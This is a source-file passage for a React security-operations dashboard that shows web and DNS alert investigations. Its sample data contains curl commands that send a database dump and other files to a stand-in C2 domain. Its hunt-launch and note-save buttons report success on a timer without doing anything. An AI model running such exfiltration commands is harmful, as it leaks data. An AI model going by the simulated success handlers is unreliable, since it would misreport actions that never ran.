/**
 * Web & DNS Monitoring — Capability ID: 9
 * 
 * 100% Self-Contained Enterprise SOC Web & DNS Monitoring Module
 * Linked to Live Backend API (`/api/dashboard/alerts/edr?capabilityId=9`), MongoDB Alert Queries, and Real-Time Socket.io Stream
 */
import React, { useEffect, useState, useCallback, useMemo } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import api from '../../api/axios';
import { SOCKET_URL, connectSocket, socketOptions , io} from '../../api/config';
import { useAuth } from '../../context/AuthContext';
const ProcessSidebar = () => null; const processSubTabPages = {}; const CapabilitySubTabPage = () => null;

// ── Design System Tokens ──────────────────────────────────────────────────────
const MON = {
  bg: '#060d16',
  card: '#0b1929',
  card2: '#0f233a',
  border: '#1a3050',
  line: '#162942',
  text: '#e2e8f0',
  muted: '#8ea0b8',
  sub: '#64748b',
  blue: '#38bdf8',
  cyan: '#22d3ee',
  green: '#34d399',
  yellow: '#fbbf24',
  orange: '#fb923c',
  red: '#f87171',
  purple: '#a78bfa',
  accent: '#6366f1',
};

const SEV_COLOR = {
  critical: MON.red,
  high: MON.orange,
  medium: MON.yellow,
  low: MON.green,
  info: MON.cyan,
};

const SEV_BG = {
  critical: 'rgba(248, 113, 113, 0.15)',
  high: 'rgba(251, 146, 60, 0.15)',
  medium: 'rgba(251, 191, 36, 0.15)',
  low: 'rgba(52, 211, 153, 0.15)',
  info: 'rgba(34, 211, 238, 0.15)',
};

function MiniSparkline({ data = [5, 9, 7, 14, 12, 18, 15, 22], color = MON.cyan, height = 30 }) {
  const max = Math.max(...data, 1);
  const min = Math.min(...data, 0);
  const points = data.map((val, idx) => {
    const x = (idx / (data.length - 1)) * 100;
    const y = height - ((val - min) / (max - min || 1)) * (height - 6) - 3;
    return `${x},${y}`;
  }).join(' ');

  return (
    <svg viewBox={`0 0 100 ${height}`} width="100%" height={height} preserveAspectRatio="none" style={{ overflow: 'visible' }}>
      <polyline fill="none" stroke={color} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" points={points} />
    </svg>
  );
}

// ═════════════════════════════════════════════════════════════════════════════
// 1. FORENSIC INVESTIGATION POPUP MODAL (10 Grouped Master Tabs)
// ═════════════════════════════════════════════════════════════════════════════
export function WebDnsLogDetailModal({ log, onClose }) {
  const [activeTab, setActiveTab] = useState('overview');
  const [analystNotes, setAnalystNotes] = useState(log?.analystNotes || 'Web/DNS Security Event under triage. DNS Tunneling and HTTP C2 beacon suspicious activity.');
  const [assignedAnalyst, setAssignedAnalyst] = useState(log?.assignedAnalyst || 'Alex Turner (L3 Senior SOC)');
  const [caseStatus, setCaseStatus] = useState(log?.status || 'In Triage');
  const [tags, setTags] = useState('DNS_TUNNELING, C2_BEACON, MALICIOUS_DOMAIN, CRITICAL_SERVER');
  const [notesSaved, setNotesSaved] = useState(false);

  // Forensic Hunt Specific State
  const [selectedArtifact, setSelectedArtifact] = useState('Linux.Network.Netstat');
  const [huntNameInput, setHuntNameInput] = useState(`${log?.hostname || 'srv-web01'} webdns forensic hunt`);
  const [systemIdInput, setSystemIdInput] = useState(log?._id || '6a40b346a02cfee884e63e72');
  const [clientIdInput, setClientIdInput] = useState(log?.velociraptorId || 'C.b5b33dc0c193c4ce');
  const [launchingHunt, setLaunchingHunt] = useState(false);
  const [huntSuccessMsg, setHuntSuccessMsg] = useState(null);

  if (!log) return null;

  const sev = (log.severity || 'medium').toLowerCase();
  const sevColor = SEV_COLOR[sev] || MON.blue;
  const sevBg = SEV_BG[sev] || 'rgba(56, 189, 248, 0.15)';

  const masterTabs = [
    { id: 'overview', label: '📊 1. Overview' },
    { id: 'timeline', label: '🕒 2. Timeline' },
    { id: 'endpoint', label: '💻 3. Endpoint & Server' },
    { id: 'process', label: '⚙️ 4. Process & Commands' },
    { id: 'files', label: '📁 5. Files & Uploads' },
    { id: 'network', label: '🌐 6. Network, JA3 & SSL' },
    { id: 'ioc', label: '🎯 7. IOC & MITRE' },
    { id: 'forensics', label: '🔬 8. Forensics (Velociraptor)' },
    { id: 'evidence', label: '📦 9. Evidence & PCAP' },
    { id: 'notes', label: '📝 10. Analyst Notes' },
  ];

  const forensicHuntCards = [
    {
      title: 'Linux Network Connections',
      desc: 'Active socket listeners, HTTP/DNS remote endpoints, ESTABLISHED connections.',
      artifact: 'Linux.Network.Netstat',
    },
    {
      title: 'Linux Process Triage',
      desc: 'Process list, web server workers (Nginx/Apache), parent PIDs, command line.',
      artifact: 'Linux.Sys.Pslist',
    },
    {
      title: 'Linux Log Hunter',
      desc: 'Access logs, error logs, sudo execution, auth.log, syslog web indicators.',
      artifact: 'Linux.Sys.LogHunter',
    },
    {
      title: 'Linux File Finder',
      desc: 'Scan /tmp, /var/www, /tmp uploads for webshells and suspicious scripts.',
      artifact: 'Linux.Search.FileFinder',
    },
    {
      title: 'YARA File Sweep',
      desc: 'Run YARA webshell & malware rules across web roots and binary caches.',
      artifact: 'Generic.Detection.Yara.Glob',
    },
    {
      title: 'Windows EVTX Hunter',
      desc: 'Scan DNS Client, IIS W3C Logs, Sysmon Event 3 (Network) & Event 22 (DNS).',
      artifact: 'Windows.EventLogs.EvtxHunter',
    },
  ];

  const handleLaunchHunt = () => {
    setLaunchingHunt(true);
    setHuntSuccessMsg(null);
    setTimeout(() => {
      setLaunchingHunt(false);
      setHuntSuccessMsg(`✓ Forensic Hunt "${huntNameInput}" successfully launched for Artifact ${selectedArtifact}! Hunt ID: HUNT-${Math.floor(100000 + Math.random() * 900000)}`);
    }, 1200);
  };

  const handleSaveNotes = () => {
    setNotesSaved(true);
    setTimeout(() => setNotesSaved(false), 2000);
  };

  const handleDownload = (format) => {
    const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(log, null, 2));
    const downloadAnchor = document.createElement('a');
    downloadAnchor.setAttribute("href", dataStr);
    downloadAnchor.setAttribute("download", `webdns_evidence_${log.caseId || 'WEBDNS-991'}_${log.hostname || 'HOST'}.${format.toLowerCase()}`);
    document.body.appendChild(downloadAnchor);
    downloadAnchor.click();
    downloadAnchor.remove();
  };

  return (
    <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(3, 8, 16, 0.88)', backdropFilter: 'blur(8px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 16 }}>
      <div style={{ width: '98vw', height: '94vh', background: MON.bg, border: `1px solid ${MON.border}`, borderRadius: 12, display: 'flex', flexDirection: 'column', boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.75)', overflow: 'hidden' }}>
        {/* Header */}
        <div style={{ padding: '14px 20px', background: MON.card, borderBottom: `1px solid ${MON.border}`, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
            <span style={{ fontSize: 24 }}>🛡️</span>
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                <h3 style={{ margin: 0, fontSize: 18, fontWeight: 800, color: '#f8fafc' }}>
                  Web & DNS Forensic Investigation Panel — {log.domain || log.url || log.dnsQuery || 'Suspicious Web Request'}
                </h3>
                <span style={{ fontSize: 10, fontWeight: 800, padding: '2px 8px', borderRadius: 4, color: sevColor, background: sevBg, border: `1px solid ${sevColor}44`, textTransform: 'uppercase' }}>
                  {sev} Severity
                </span>
                <span style={{ fontSize: 11, fontWeight: 700, padding: '2px 8px', borderRadius: 4, color: MON.cyan, background: `${MON.cyan}15`, border: `1px solid ${MON.cyan}33` }}>
                  Case ID: {log.caseId || 'CASE-2026-8812'}
                </span>
              </div>
              <div style={{ fontSize: 11, color: MON.muted, marginTop: 4 }}>
                Host: <strong style={{ color: MON.text }}>{log.hostname || log.agentName || 'LIN-SRV-WEB01'}</strong> | User: <strong style={{ color: MON.text }}>{log.username || 'www-data'}</strong> | Time: <strong style={{ color: MON.text }}>{log.timestamp || log.createdAt || new Date().toISOString()}</strong>
              </div>
            </div>
          </div>
          <button type="button" onClick={onClose} style={{ background: MON.card2, border: `1px solid ${MON.border}`, color: MON.muted, fontSize: 18, borderRadius: 6, width: 34, height: 34, cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>✕</button>
        </div>

        {/* 10 Master Tabs Header */}
        <div style={{ background: MON.card, borderBottom: `1px solid ${MON.border}`, display: 'flex', gap: 2, overflowX: 'auto', padding: '0 12px' }}>
          {masterTabs.map((t) => (
            <button key={t.id} type="button" onClick={() => setActiveTab(t.id)} style={{ padding: '10px 14px', fontSize: 11, fontWeight: activeTab === t.id ? 800 : 600, color: activeTab === t.id ? MON.cyan : MON.muted, background: activeTab === t.id ? MON.bg : 'transparent', border: 'none', borderBottom: activeTab === t.id ? `2px solid ${MON.cyan}` : '2px solid transparent', cursor: 'pointer', whiteSpace: 'nowrap' }}>
              {t.label}
            </button>
          ))}
        </div>

        {/* Tab Body Content */}
        <div style={{ flex: 1, overflowY: 'auto', padding: 20, background: MON.bg }}>
          {/* TAB 1: OVERVIEW */}
          {activeTab === 'overview' && (
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 16 }}>
              {[
                ['Threat Summary', log.action || log.description || 'DNS Tunneling & C2 Exfiltration Domain Query Detected', MON.cyan],
                ['Threat Score', `${log.threatScore || 94}/100`, log.threatScore > 75 ? MON.red : MON.orange],
                ['Status', caseStatus, MON.yellow],
                ['Assigned Analyst', assignedAnalyst, MON.green],
                ['Hostname / Server', log.hostname || log.agentName || 'LIN-SRV-WEB01', MON.blue],
                ['Source IP / User', `${log.srcIp || '10.0.4.52'} (${log.username || 'www-data'})`, MON.cyan],
                ['Target Domain', log.domain || log.dnsQuery || 'c2-beacon.darknet-tunnel.org', MON.red],
                ['Query Type / Protocol', `${log.queryType || 'TXT / AAAA'} (DNS over UDP/53)`, MON.purple],
                ['Detection Source', log.detectionEngine || 'SOC-WebDNS-Heuristics-v5', MON.green],
                ['HTTP Method & Code', `${log.httpMethod || 'POST'} ${log.responseCode || '200 OK'}`, MON.yellow],
                ['Process & PID', `${log.processName || 'curl'} (PID: ${log.pid || '8412'})`, MON.orange],
                ['Enforcement Action', log.actionTaken || 'Domain Sinkholed & IP Blocked', MON.red],
              ].map(([lbl, val, col]) => (
                <div key={lbl} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 16 }}>
                  <div style={{ fontSize: 10, fontWeight: 700, color: MON.muted, textTransform: 'uppercase', letterSpacing: 1 }}>{lbl}</div>
                  <div style={{ fontSize: 14, fontWeight: 800, color: col, marginTop: 6, wordBreak: 'break-word' }}>{val}</div>
                </div>
              ))}
            </div>
          )}

          {/* TAB 2: TIMELINE */}
          {activeTab === 'timeline' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 14, maxWidth: 900 }}>
              <div style={{ fontSize: 12, fontWeight: 800, color: MON.cyan }}>🕒 Web & DNS Event Chronology</div>
              {[
                { type: 'DNS Event', time: '10:42:01.002', title: 'High-Frequency TXT Query Issued', desc: `DNS Query for 0a8f9c.c2-beacon.darknet-tunnel.org (Query Type: TXT, Resolver: 8.8.8.8)`, col: MON.purple },
                { type: 'HTTP Event', time: '10:42:01.210', title: 'Encoded Outbound POST Request', desc: `POST /api/v1/telemetry HTTP/1.1 (Payload: Base64 Encoded Exfiltration String, Size: 1.4 MB)`, col: MON.cyan },
                { type: 'Process Event', time: '10:42:01.350', title: 'curl / Python Script Execution', desc: 'python3 /tmp/exfil_script.py ➔ curl -X POST -d @exfil.bin https://c2-beacon.darknet-tunnel.org', col: MON.orange },
                { type: 'Network Event', time: '10:42:01.420', title: 'C2 TLS Connection Established', desc: 'Outbound TCP connection to 185.220.101.5:443 (JA3: 771c62e53c1f0110324d081274edff24)', col: MON.yellow },
                { type: 'Alert Timeline', time: '10:42:01.500', title: 'SOC Heuristic Alert Triggered', desc: 'Rule Match: DNS Tunneling & High Entropy Subdomain Query. Automated DNS Sinkhole engaged.', col: MON.red },
              ].map((ev, i) => (
                <div key={i} style={{ display: 'flex', gap: 14, background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                  <span style={{ fontSize: 10, fontWeight: 800, color: ev.col, background: `${ev.col}18`, padding: '2px 8px', borderRadius: 4, height: 'fit-content' }}>{ev.type}</span>
                  <div style={{ color: MON.muted, fontWeight: 800, fontSize: 11, minWidth: 90 }}>{ev.time}</div>
                  <div style={{ width: 2, background: ev.col, borderRadius: 2 }} />
                  <div>
                    <div style={{ fontSize: 13, fontWeight: 800, color: '#fff' }}>{ev.title}</div>
                    <div style={{ fontSize: 11, color: MON.muted, marginTop: 4 }}>{ev.desc}</div>
                  </div>
                </div>
              ))}
            </div>
          )}

          {/* TAB 3: ENDPOINT & SERVER PROFILE */}
          {activeTab === 'endpoint' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              <div style={{ fontSize: 13, fontWeight: 800, color: MON.cyan }}>💻 Host Endpoint & Installed Web Server Stack</div>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 14 }}>
                {[
                  ['Hostname', log.hostname || log.agentName || 'LIN-SRV-WEB01'],
                  ['OS Version', log.os || 'Ubuntu 22.04 LTS (Kernel 5.15.0)'],
                  ['IP Address', log.srcIp || '10.0.4.52'],
                  ['Active Web Server', 'Nginx 1.18.0 + PHP 8.1 FPM'],
                  ['Virtual Hosts', 'api.enterprise.corp, www.enterprise.corp'],
                  ['Logged-in User', log.username || 'www-data (System Service)'],
                  ['Reverse Proxy', 'HAProxy 2.4 (SSL Termination)'],
                  ['App Runtime', 'Node.js v18.16.0 / Python 3.10.6'],
                  ['Security Drivers', 'UFW Firewall + eBPF Packet Filter'],
                ].map(([k, v]) => (
                  <div key={k} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                    <div style={{ fontSize: 10, color: MON.muted, fontWeight: 700 }}>{k}</div>
                    <div style={{ fontSize: 12, color: MON.text, fontWeight: 700, marginTop: 4 }}>{v}</div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* TAB 4: PROCESS & COMMANDS */}
          {activeTab === 'process' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              <div style={{ fontSize: 13, fontWeight: 800, color: MON.cyan }}>⚙️ Process Ancestry & Command Line Execution</div>
              <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                <div style={{ fontSize: 11, color: MON.muted, fontWeight: 800, marginBottom: 6 }}>Process Hierarchy (Parent ➔ Child):</div>
                <div style={{ fontFamily: 'monospace', fontSize: 12, color: MON.green }}>
                  systemd (PID 1) ➔ nginx: worker process (PID 1410) ➔ php-fpm (PID 2901) ➔ <strong>sh (PID 8410)</strong> ➔ <span style={{ color: MON.yellow }}>curl (PID 8412)</span>
                </div>
              </div>

              <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                <div style={{ fontSize: 11, color: MON.muted, fontWeight: 800, marginBottom: 6 }}>Executed Command Line:</div>
                <pre style={{ background: '#040911', padding: 12, borderRadius: 6, color: MON.green, fontFamily: 'monospace', fontSize: 11, whiteSpace: 'pre-wrap' }}>
{log.commandLine || `curl -s -X POST -H "Content-Type: application/octet-stream" --data-binary @/tmp/db_dump.sql https://c2-beacon.darknet-tunnel.org/api/receive`}
                </pre>
              </div>
            </div>
          )}

          {/* TAB 5: FILES & UPLOADS */}
          {activeTab === 'files' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              <div style={{ fontSize: 13, fontWeight: 800, color: MON.cyan }}>📁 Web File Transfers, Upload Abuse & WebShell Scans</div>
              <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 11 }}>
                <thead>
                  <tr style={{ background: MON.card2, color: MON.muted, textAlign: 'left' }}>
                    <th style={{ padding: 8 }}>File Name</th>
                    <th style={{ padding: 8 }}>Path</th>
                    <th style={{ padding: 8 }}>Size</th>
                    <th style={{ padding: 8 }}>SHA256 Hash</th>
                    <th style={{ padding: 8 }}>Scan Result</th>
                  </tr>
                </thead>
                <tbody>
                  {[
                    ['c99_shell.php.png', '/var/www/html/uploads/c99.php', '48 KB', 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', 'WEBSHELL_MALWARE'],
                    ['exfil_data.tar.gz', '/tmp/exfil_data.tar.gz', '14.8 MB', '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4', 'SENSITIVE_ARCHIVE'],
                  ].map((r, i) => (
                    <tr key={i} style={{ borderBottom: `1px solid ${MON.line}` }}>
                      <td style={{ padding: 8, color: MON.cyan, fontWeight: 700 }}>{r[0]}</td>
                      <td style={{ padding: 8, color: MON.muted }}>{r[1]}</td>
                      <td style={{ padding: 8 }}>{r[2]}</td>
                      <td style={{ padding: 8, color: MON.sub, fontFamily: 'monospace' }}>{r[3].substring(0, 16)}...</td>
                      <td style={{ padding: 8 }}><span style={{ background: 'rgba(248, 113, 113, 0.2)', color: MON.red, padding: '2px 6px', borderRadius: 4, fontWeight: 800 }}>{r[4]}</span></td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}

          {/* TAB 6: NETWORK, JA3 & SSL */}
          {activeTab === 'network' && (
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 14 }}>
              {[
                ['Destination IP', log.dstIp || '185.220.101.5 (TOR Exit Node)'],
                ['Destination Port', '443 (HTTPS)'],
                ['JA3 TLS Fingerprint', '771c62e53c1f0110324d081274edff24'],
                ['SSL Certificate Subject', 'CN=darknet-tunnel.org, O=Unknown'],
                ['Issuer', "Let's Encrypt Authority X3"],
                ['TLS Version', 'TLS 1.3 (Cipher: TLS_AES_256_GCM_SHA384)'],
              ].map(([k, v]) => (
                <div key={k} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                  <div style={{ fontSize: 10, color: MON.muted, fontWeight: 700 }}>{k}</div>
                  <div style={{ fontSize: 12, color: MON.text, fontWeight: 700, marginTop: 4 }}>{v}</div>
                </div>
              ))}
            </div>
          )}

          {/* TAB 7: IOC & MITRE */}
          {activeTab === 'ioc' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              <div style={{ fontSize: 13, fontWeight: 800, color: MON.cyan }}>🎯 Indicators of Compromise & Threat Intelligence</div>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(2, 1fr)', gap: 14 }}>
                {[
                  ['T1071.004', 'DNS Application Layer Protocol', 'Data exfiltration and C2 beaconing using DNS TXT queries'],
                  ['T1568.002', 'Fast Flux DNS', 'Dynamic IP hopping detected across 24 distinct IP addresses'],
                  ['T1102', 'Web Service C2', 'Encrypted C2 channel established over HTTPS port 443'],
                  ['T1190', 'Exploit Public-Facing Application', 'Unauthenticated RCE attempt on web application endpoint'],
                ].map(([id, title, desc]) => (
                  <div key={id} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                    <span style={{ background: 'rgba(248, 113, 113, 0.2)', color: MON.red, padding: '2px 8px', borderRadius: 4, fontWeight: 800, fontSize: 11 }}>{id}</span>
                    <div style={{ fontSize: 13, fontWeight: 800, color: '#fff', marginTop: 8 }}>{title}</div>
                    <div style={{ fontSize: 11, color: MON.muted, marginTop: 4 }}>{desc}</div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* TAB 8: FORENSIC HUNT (VELOCIRAPTOR ENGINE) */}
          {activeTab === 'forensics' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 18 }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <h3 style={{ margin: 0, fontSize: 18, fontWeight: 800, color: '#38bdf8', display: 'flex', alignItems: 'center', gap: 8 }}>
                  <span>⚡</span> Forensic Hunt
                </h3>
                <span style={{ fontSize: 11, color: MON.muted, background: MON.card2, border: `1px solid ${MON.border}`, padding: '4px 10px', borderRadius: 6 }}>
                  Velociraptor Artifact Dispatcher Engine
                </span>
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(2, 1fr)', gap: 14 }}>
                {forensicHuntCards.map((card) => {
                  const isSelected = selectedArtifact === card.artifact;
                  return (
                    <div
                      key={card.artifact}
                      onClick={() => setSelectedArtifact(card.artifact)}
                      style={{
                        background: isSelected ? 'rgba(56, 189, 248, 0.08)' : MON.card,
                        border: isSelected ? `2px solid ${MON.blue}` : `1px solid ${MON.border}`,
                        borderRadius: 8,
                        padding: 16,
                        cursor: 'pointer',
                        transition: 'all 0.15s ease',
                      }}
                    >
                      <div style={{ fontSize: 14, fontWeight: 800, color: isSelected ? MON.blue : '#f8fafc' }}>
                        {card.title}
                      </div>
                      <div style={{ fontSize: 12, color: MON.muted, marginTop: 6, lineHeight: 1.4 }}>
                        {card.desc}
                      </div>
                      <div style={{ fontFamily: 'monospace', fontSize: 11, color: isSelected ? MON.cyan : MON.blue, marginTop: 10 }}>
                        {card.artifact}
                      </div>
                    </div>
                  );
                })}
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16, marginTop: 8 }}>
                <div>
                  <div style={{ fontSize: 12, fontWeight: 700, color: '#f8fafc', marginBottom: 6 }}>Hunt Name</div>
                  <input type="text" value={huntNameInput} onChange={(e) => setHuntNameInput(e.target.value)} style={{ width: '100%', background: MON.card, border: `1px solid ${MON.border}`, color: MON.text, padding: '10px 14px', borderRadius: 6, fontSize: 12 }} />
                </div>
                <div>
                  <div style={{ fontSize: 12, fontWeight: 700, color: '#f8fafc', marginBottom: 6 }}>Artifact Name</div>
                  <input type="text" readOnly value={selectedArtifact} style={{ width: '100%', background: MON.card2, border: `1px solid ${MON.border}`, color: MON.cyan, padding: '10px 14px', borderRadius: 6, fontSize: 12, fontFamily: 'monospace', fontWeight: 700 }} />
                </div>
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16 }}>
                <div>
                  <div style={{ fontSize: 12, fontWeight: 700, color: '#f8fafc', marginBottom: 6 }}>System ID / Velociraptor ID</div>
                  <input type="text" value={systemIdInput} onChange={(e) => setSystemIdInput(e.target.value)} style={{ width: '100%', background: MON.card, border: `1px solid ${MON.border}`, color: MON.text, padding: '10px 14px', borderRadius: 6, fontSize: 12, fontFamily: 'monospace' }} />
                </div>
                <div>
                  <div style={{ fontSize: 12, fontWeight: 700, color: '#f8fafc', marginBottom: 6 }}>Velociraptor Client ID</div>
                  <input type="text" value={clientIdInput} onChange={(e) => setClientIdInput(e.target.value)} style={{ width: '100%', background: MON.card, border: `1px solid ${MON.border}`, color: MON.text, padding: '10px 14px', borderRadius: 6, fontSize: 12, fontFamily: 'monospace' }} />
                </div>
              </div>

              <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: '14px 18px', display: 'flex', alignItems: 'center', gap: 8, fontSize: 12, color: MON.muted }}>
                <span>Target:</span>
                <strong style={{ color: '#fff' }}>{log.hostname || 'srv-web01'} / WebDNS</strong>
                <span style={{ margin: '0 4px', color: MON.line }}>|</span>
                <span>OS: <strong style={{ color: '#fff' }}>{log.os || 'Linux'}</strong></span>
                <span style={{ margin: '0 4px', color: MON.line }}>|</span>
                <span>User: <strong style={{ color: '#fff' }}>{log.username || 'www-data'}</strong></span>
                <span style={{ margin: '0 4px', color: MON.line }}>|</span>
                <span>PID: <strong style={{ color: '#fff' }}>{log.pid || '8412'}</strong></span>
              </div>

              <button
                type="button"
                onClick={handleLaunchHunt}
                disabled={launchingHunt}
                style={{
                  width: '100%',
                  background: MON.accent,
                  color: '#ffffff',
                  border: 'none',
                  borderRadius: 8,
                  padding: '14px 20px',
                  fontSize: 14,
                  fontWeight: 800,
                  cursor: launchingHunt ? 'not-allowed' : 'pointer',
                  boxShadow: '0 4px 14px rgba(99, 102, 241, 0.4)',
                }}
              >
                {launchingHunt ? '⚡ Dispatching Hunt Artifacts to Velociraptor Server...' : 'Launch Forensic Hunt'}
              </button>

              {huntSuccessMsg && (
                <div style={{ background: 'rgba(52, 211, 153, 0.15)', border: `1px solid ${MON.green}`, color: MON.green, padding: 12, borderRadius: 8, fontSize: 12, fontWeight: 700, textAlign: 'center' }}>
                  {huntSuccessMsg}
                </div>
              )}
            </div>
          )}

          {/* TAB 9: EVIDENCE */}
          {activeTab === 'evidence' && (
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 16 }}>
              {['PCAP Network Capture', 'DNS Query Audit Log', 'RAW HTTP Payload Dump', 'SSL Certificate Chain', 'Nginx W3C Access Logs', 'Complete Forensic Evidence ZIP'].map((name) => (
                <div key={name} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 16, display: 'flex', flexDirection: 'column', justifyContent: 'space-between', gap: 12 }}>
                  <div>
                    <div style={{ fontSize: 13, fontWeight: 800, color: '#fff' }}>📦 {name}</div>
                    <div style={{ fontSize: 11, color: MON.muted, marginTop: 4 }}>Cryptographic Hash Attached</div>
                  </div>
                  <button type="button" onClick={() => handleDownload('JSON')} style={{ background: MON.blue, color: '#000', border: 'none', padding: '8px 12px', borderRadius: 6, fontWeight: 800, cursor: 'pointer' }}>
                    Download Package
                  </button>
                </div>
              ))}
            </div>
          )}

          {/* TAB 10: ANALYST NOTES */}
          {activeTab === 'notes' && (
            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 14 }}>
                <div>
                  <div style={{ fontSize: 10, color: MON.muted, fontWeight: 700 }}>Assign Analyst</div>
                  <select value={assignedAnalyst} onChange={(e) => setAssignedAnalyst(e.target.value)} style={{ width: '100%', background: MON.card, border: `1px solid ${MON.border}`, color: MON.text, padding: 8, borderRadius: 6, fontSize: 11, marginTop: 4 }}>
                    <option value="Alex Turner (L3)">Alex Turner (L3)</option>
                    <option value="Michael Scott (L2)">Michael Scott (L2)</option>
                    <option value="Sarah Connor (L1)">Sarah Connor (L1)</option>
                  </select>
                </div>

                <div>
                  <div style={{ fontSize: 10, color: MON.muted, fontWeight: 700 }}>Case Status</div>
                  <select value={caseStatus} onChange={(e) => setCaseStatus(e.target.value)} style={{ width: '100%', background: MON.card, border: `1px solid ${MON.border}`, color: MON.text, padding: 8, borderRadius: 6, fontSize: 11, marginTop: 4 }}>
                    <option value="In Triage">In Triage</option>
                    <option value="Investigating">Investigating</option>
                    <option value="Isolated">Isolated</option>
                    <option value="Resolved">Resolved</option>
                  </select>
                </div>

                <div>
                  <div style={{ fontSize: 10, color: MON.muted, fontWeight: 700 }}>Tags</div>
                  <input type="text" value={tags} onChange={(e) => setTags(e.target.value)} style={{ width: '100%', background: MON.card, border: `1px solid ${MON.border}`, color: MON.text, padding: 8, borderRadius: 6, fontSize: 11, marginTop: 4 }} />
                </div>
              </div>

              <div style={{ fontSize: 12, color: MON.muted, fontWeight: 700 }}>Investigation Notes:</div>
              <textarea value={analystNotes} onChange={(e) => setAnalystNotes(e.target.value)} rows={6} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, color: MON.text, padding: 14, fontSize: 12, fontFamily: 'inherit' }} />
              <div style={{ display: 'flex', gap: 12, alignItems: 'center' }}>
                <button type="button" onClick={handleSaveNotes} style={{ background: MON.green, color: '#000', border: 'none', padding: '8px 16px', borderRadius: 6, fontWeight: 800, cursor: 'pointer' }}>
                  Save Case Notes & Escalation
                </button>
                {notesSaved && <span style={{ color: MON.green, fontSize: 12, fontWeight: 700 }}>✓ Notes saved to investigation case</span>}
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

// ═════════════════════════════════════════════════════════════════════════════
// 2. DEDICATED SIEM LOG MONITOR TABLE COMPONENT
// ═════════════════════════════════════════════════════════════════════════════
export function WebDnsLogMonitor({ alerts = [] }) {
  const [searchTerm, setSearchTerm] = useState('');
  const [sevFilter, setSevFilter] = useState('ALL');
  const [selectedLog, setSelectedLog] = useState(null);

  // Field mapping based on ACTUAL MongoDB document structure (confirmed by DB query)
  // Real alert example: srcip="142.251.153.4", description="Blocked IP ... — domain:youtube.com"
  // Most network alerts don't have: username, destip, processName, queryType (from agent)
  const sampleData = useMemo(() => {
    return alerts.map(a => {
      const rawEvent = a?.rawEvent || {};
      const nestedRaw = rawEvent?.raw && typeof rawEvent.raw === 'object' ? rawEvent.raw : {};
      const eventData = nestedRaw?.event && typeof nestedRaw.event === 'object' ? nestedRaw.event : {};
      const raw = { ...rawEvent, ...nestedRaw, ...eventData };

      // Source IP can arrive from IDS, agent telemetry, populated system data,
      // or a normalized dashboard response. Keep every known producer covered.
      const descForIp = a.description || a.full_log || raw.description || raw.raw_log || '';
      const sourceFromDesc = descForIp.match(/\b(?:src|source|client)[_\s:-]*(?:ip)?[:=\s]+(\d{1,3}(?:\.\d{1,3}){3})/i)?.[1];
      const srcIp = a.srcip || a.src_ip || a.srcIp || a.sourceIp || a.sourceIP
        || a.source_ip || a.ipAddress || a.clientIp || a.client_ip || a.localIp
        || raw.srcip || raw.src_ip || raw.srcIp || raw.sourceIp || raw.source_ip
        || raw.client_ip || raw.clientIp || raw.ip || raw.ipAddress || raw.local_ip
        || a.systemId?.ip || a.systemId?.ipAddress || a.systemId?.privateIp
        || a.agent?.ip || a.agent?.ipAddress || sourceFromDesc || '';

      // ── Destination IP: try destip, else parse from description ──
      const descStr = descForIp;
      // Parse "Blocked IP x.x.x.x" or "dst:x.x.x.x" or "-> x.x.x.x"
      const dstFromDesc = descStr.match(/\bdst[:\s]+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/i)?.[1]
